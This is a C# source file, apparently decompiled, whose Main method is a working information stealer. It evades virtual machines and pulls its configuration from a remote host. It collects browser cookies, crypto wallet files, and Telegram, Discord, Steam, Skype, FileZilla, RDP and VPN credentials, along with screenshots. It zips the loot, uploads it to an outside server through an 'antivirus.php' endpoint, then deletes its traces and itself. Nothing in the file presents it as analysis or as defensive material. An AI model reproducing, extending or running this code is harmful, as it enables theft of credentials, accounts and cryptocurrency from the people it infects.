using System;
using System.IO;
using System.Net;
using bitdomain;
using c0unt;
using cr;
using f1lezilla;
using hw1d;
using jaber;
using killer;
using Nordvpn;
using opvpn;
using prtvpn;
using rDr;
using Screen;
using skypemsg;
using Stealer;
using tdata;
using trashman;

namespace White
{
	// Token: 0x02000020 RID: 32
	internal class Program
	{
		// Token: 0x06000099 RID: 153 RVA: 0x0000ABD8 File Offset: 0x00008DD8
		[STAThread]
		private static void Main(string[] args)
		{
			bool flag = File.Exists(Program.path2);
			if (flag)
			{
				Environment.Exit(0);
			}
			bool flag2 = !AntiVM.GetCheckVMBot();
			if (!flag2)
			{
				Environment.Exit(0);
			}
			string text = "http://almazscss.website/";
			string text2 = new WebClient().DownloadString(text + "cfg.php");
			string defpath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/Windows";
			Directory.CreateDirectory(defpath);
			Browsers.Steal(Program.path);
			dnschange.dns("8.8.8.8");
			bool flag3 = text2[4].ToString() == "1";
			if (flag3)
			{
				filezilla.file();
				rdp.Rdp();
			}
			hwid.GetHWID();
			hwid.getprocesses();
			bool flag4 = text2[0].ToString() == "1";
			if (flag4)
			{
				crypto.DirSearch(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
				crypto.DirSearch(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
				crypto.DirSearch(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
				crypto.DirSearch("C:\\Users\\" + Environment.UserName + "\\Downloads");
			}
			jabber.jab();
			telegram.telegramData();
			ScreenShot.Screenshot();
			hwid.getprogrammes();
			Files.Steam(Program.steamm);
			skype.skypelog();
			bool flag5 = text2[2].ToString() == "1";
			if (flag5)
			{
				nord.vpn();
				protonvpn.pr0t0nvpn();
				ovpn.openvpn();
			}
			int steam = count.GetSteam();
			int jabber = count.GetJabber();
			int crypto = count.GetCrypto();
			int desktop = count.GetDesktop();
			int discord = count.GetDiscord();
			string text3 = trash.rndname(20);
			string[] files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
			foreach (string text4 in files)
			{
				bool flag6 = Path.GetFileName(text4).StartsWith("System_");
				if (flag6)
				{
					File.Delete(text4);
				}
			}
			using (WebClient webClient = new WebClient())
			{
				webClient.DownloadFile(text + "ICSharpCode.SharpZipLib.dll", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "/ICSharpCode.SharpZipLib.dll");
				trash.Zip(text3, Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), defpath);
			}
			trash.s3nder(string.Concat(new string[]
			{
				text,
				"antivirus.php?hwid=",
				text3,
				"&crypto=",
				crypto.ToString(),
				"&jabber=",
				jabber.ToString(),
				"&steam=",
				steam.ToString(),
				"&desktop=",
				desktop.ToString(),
				"&discord=",
				discord.ToString()
			}), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/" + text3 + ".zip");
			Directory.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/Windows", true);
			File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/" + text3 + ".zip");
			killerr.SelfDel();
		}

		// Token: 0x0600009A RID: 154 RVA: 0x0000AF10 File Offset: 0x00009110
		public static void Discord(string path)
		{
			try
			{
				bool flag = File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\https_discordapp.com_0.localstorage");
				if (flag)
				{
					Directory.CreateDirectory(path);
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\https_discordapp.com_0.localstorage", path + "\\https_discordapp.com_0.localstorage", true);
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000026 RID: 38
		public static string path2 = "C:\\ProgramData\\debug.txt";

		// Token: 0x04000027 RID: 39
		public static string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/Windows/Cookies";

		// Token: 0x04000028 RID: 40
		public static string steamm = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/Windows/Steam";

		// Token: 0x04000029 RID: 41
		public static string telegramm = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/Windows/Telegram";

		// Token: 0x0400002A RID: 42
		public static string filezillaa = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/Windows/FileZilla";

		// Token: 0x0400002B RID: 43
		public static string discordd = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/Windows/Discord";
	}
}
